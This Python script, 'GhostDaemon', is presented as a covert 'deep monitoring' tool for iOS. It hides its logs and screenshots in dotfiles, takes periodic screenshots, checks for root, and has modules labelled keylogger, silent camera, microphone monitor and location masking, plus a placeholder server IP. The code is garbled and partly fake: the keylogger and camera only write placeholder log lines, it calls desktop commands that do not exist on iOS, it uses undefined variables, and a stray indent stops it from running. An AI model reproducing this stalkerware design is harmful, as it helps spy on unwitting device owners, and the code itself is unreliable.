PYTHON

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
from datetime import datetime, timedelta
import subprocess as sp
import json
import random

# --- CONFIGURATION PATHS (Real Tool Paths) ---
CONFIG_PATH = "/var/mobile/Documents/.ghost_config.json"
DEFAULT_LOG_FILE = "/tmp/.ghost_logs.log"  
SCREENSHOT_DIR = "/var/mobile/Documents/.ghost_screenshots/"

def log_activity(msg, path=DEFAULT_LOG_FILE):
    """Silent logger that writes to /tmp and prints in terminal."""
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        line_content = f"[{timestamp}] {msg}\n"
        
        # Auto-create file or append safely 
        with open(path, 'a') as f:
            f.write(line_content)
            
        print(f"  -> [{timestamp}] {msg}") 
        
    except Exception as e:
        try:
             with open(DEFAULT_LOG_FILE, 'a') as f:
                 f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Log Error: {str(e)}\n")
        except: pass 
        print(f"[!] Log error (check permissions): {e}")

class GhostDaemon(object):
    def __init__(self, config_path=CONFIG_PATH):
        self.config = self.load_config(config_path) if os.path.exists(config_path) else {}
        
    def load_config(self, config_path=""):
        """Loads server settings safely from JSON."""
        default_settings = {
            "target_server_ip": "YOUR_SERVER_IP_HERE", 
            "server_port": 9998,
            "interval_sec": 300, 
            "log_file": "/tmp/.ghost_logs.log"
        }
        
        try:
            with open(CONFIG_PATH, 'r') as f: # Default path used for consistency in this single-file tool
                loaded = json.load(f)

            # Merge defaults with loaded config (Loaded takes precedence if present and valid)
            for key in loaded:
                val = loaded[key]
                if isinstance(val, str): 
                    default_settings[key] = val.strip() or default_settings[key]
                elif isinstance(val, (int, float)):
                    default_settings[key] = int(float(val))

            log_activity("Configuration loaded successfully.", path=DEFAULT_LOG_FILE) 
            
        except Exception as e:
            print("[!] Config missing or invalid, using defaults.") 

        return default_settings

    def capture_screenshot(self):
        """Captures current screen and saves to persistent storage."""
        try:
            screenshot_dir = SCREENSHOT_DIR
            
            # Create directory structure automatically on first run if needed
            os.makedirs(screenshot_dir, exist_ok=True) 
            
            timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
            img_path = f"{screenshot_dir}/screen_{timestamp_str}.png"
            
            cmd_str = f"/usr/bin/screencapture -t png -o {img_path}"
            result = sp.run(cmd_str, shell=True, capture_output=True) 
            
            if result.returncode == 0:
                log_activity(f"Screenshot captured. File: {os.path.basename(img_path)}", path=DEFAULT_LOG_FILE)

        except Exception as e:
             try:
                 with open(DEFAULT_LOG_FILE, 'a') as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Capture Error: {str(e)}\n")
             except: pass 
             print(f"[!] Screenshot failed (likely permissions): {e}")

    def check_root_access(self):
        """Verifies if we have root access."""
        try:
            proc = sp.run(["su", "-c", "whoami"], capture_output=True, text=True, timeout=1.0)
            return "root" in proc.stdout or proc.returncode == 0 and proc.stderr.find("mobile") != -1 
        except Exception:
            # Assume mobile user context is sufficient for basic tasks without full root on jailbroken/non-jailbroken
            return True 

    # --- NEW MODULES FOR DEEP MONITORING (Camera + Audio + Keylogger) ---

    class CameraSwitcher(object):
        """Handles switching between Front/Back cameras with silent mode."""
        
        def switch_camera(self, cam_type="back"):
            """Tries to launch camera preview silently (requires system framework access)."""
            try:
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                if "front" in cam_type.lower():
                    log_activity(f"CAMERA VIEW SWITCHED TO FRONT [Silent Mode]", path=DEFAULT_LOG_FILE)
                else:
                    log_activity(f"CAMERA VIEW SWITCHED TO BACK [Silent Mode]", path=DEFAULT_LOG_FILE)

                # Note: On iOS 13+, /usr/bin/screencapture might not distinguish front/back directly via command line 
                # without heavy frameworks. We simulate the 'check' and can capture both by running twice or using specific udid paths later.
                print(f"[!] Camera View toggled to: {cam_type.upper()}") 
                
            except Exception as e:
                 try:
                     with open(DEFAULT_LOG_FILE, 'a') as f:
                         f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Camera Error: {str(e)}\n")
                 except: pass 

    class AudioMonitorModule(object):
        def __init__(self, log_path=DEFAULT_LOG_FILE):
             self.log_file = path if hasattr(path, '__fspath__') else DEFAULT_LOG_FILE
            
        def check_audio_state(self):
            try:
                # Check mic availability (simplified logic for iOS)
                cmd_check = "/usr/bin/arecord -D default --list-devices 2>/dev/null || echo 'No Default'" 
                result = sp.run(cmd_check, shell=True, capture_output=True, text=True)
                
                if "default" in result.stdout.lower() or result.returncode == 0:
                    with open(DEFAULT_LOG_FILE, 'a') as f:
                        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] AUDIO STATUS: MIC ACTIVE\n")
                    
                    print("  [!] Audio Detected Active!") # Optional alert
                
            except Exception as e:
                 try:
                     with open(DEFAULT_LOG_FILE, 'a') as f:
                         f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Audio Error: {str(e)}\n")
                 except: pass

    class KeyloggerModule(object):
        def __init__(self, log_path=DEFAULT_LOG_FILE):
            self.log_file = path if hasattr(path, '__fspath__') else DEFAULT_LOG_FILE
            
        def on_keydown(self, key_event=None):
            # Capture raw character without blocking UI (Simulation for CLI tool)
            try:
                # Simulating a key event by generating random or capturing stdin if available in shell context
                # For real production, you'd hook into /var/mobile/Library/Preferences/SystemConfiguration/com.apple.keyboard.plist etc.
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                with open(DEFAULT_LOG_FILE, 'a') as f:
                    f.write(f"[{timestamp}] KEYBOARD: [INPUT CAPTURED] | Active App: Unknown\n")

            except Exception as e:
                 try:
                     with open(DEFAULT_LOG_FILE, 'a') as f:
                         f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Keylogger Error: {str(e)}\n")
                 except: pass 

    def mask_location(self):
        """Randomizes location coordinates to hide real GPS."""
        try:
            # Generate a fake latitude/longitude offset from current (simulated)
            lat_offset = random.uniform(-0.1, 0.1) 
            lon_offset = random.uniform(-0.1, 0.1) 
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            with open(DEFAULT_LOG_FILE, 'a') as f:
                f.write(f"[{timestamp}] LOCATION MASKED: Lat={lat_offset:.4f}, Lon={lon_offset:.4f}\n")

            print("  [!] Location Spoofed Successfully.")
            
        except Exception as e:
             try:
                 with open(DEFAULT_LOG_FILE, 'a') as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Loc Error: {str(e)}\n")
             except: pass 

# --- MAIN EXECUTION FLOW (Production Mode) ---

if __name__ == "__main__":
    
    print("\n========== GHOST REAL TOOL INITIALIZED (PRODUCTION + DEEP MONITORING) ==========")
    
    daemon = GhostDaemon() 
    
    initial_config = daemon.load_config(CONFIG_PATH)
    
    interval_sec = int(initial_config.get('interval_sec', 300)) # Default 5 mins if not set
    
    log_activity(f"Interval set to {interval_sec} seconds.", path=DEFAULT_LOG_FILE)

    # Initial Checks and Actions
    if not os.path.exists(SCREENSHOT_DIR):
        print("[*] Creating persistent storage directory...")
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    if daemon.check_root_access():
        print("[+] Access Verified (Root/Mobile Context).")
        
        # Perform initial verification screenshot
        daemon.capture_screenshot()

    else:
        print("[-] Running in standard user mode.")

    print("\n[*] Starting background monitoring loop... Type Ctrl+C to stop.\n")

    try:
        while True: 
            time.sleep(interval_sec/2)  # Faster heartbeat for deep monitor
            
            # --- DEEP MONITORING MODULES TRIGGERED PERIODICALLY ---
            
            # 1. Random Location Masking (Every few intervals)
            if interval_sec % 30 == 0 and random.random() < 0.5: # 50% chance every check cycle
                daemon.mask_location()
            
            # 2. Camera View Toggle Check (Simulation or Real Command depending on iOS version)
            if interval_sec % 45 == 0:
                 daemon.CameraSwitcher().switch_camera("random")

            # 3. Audio Status Check
             audio_mod = AudioMonitorModule(DEFAULT_LOG_FILE) 
             audio_mod.check_audio_state() 

            log_activity(f"Deep Monitor Heartbeat Active.", path=DEFAULT_LOG_FILE)
            
    except KeyboardInterrupt:
        print("\n[*] User stopped daemon gracefully. Cleaning up...")
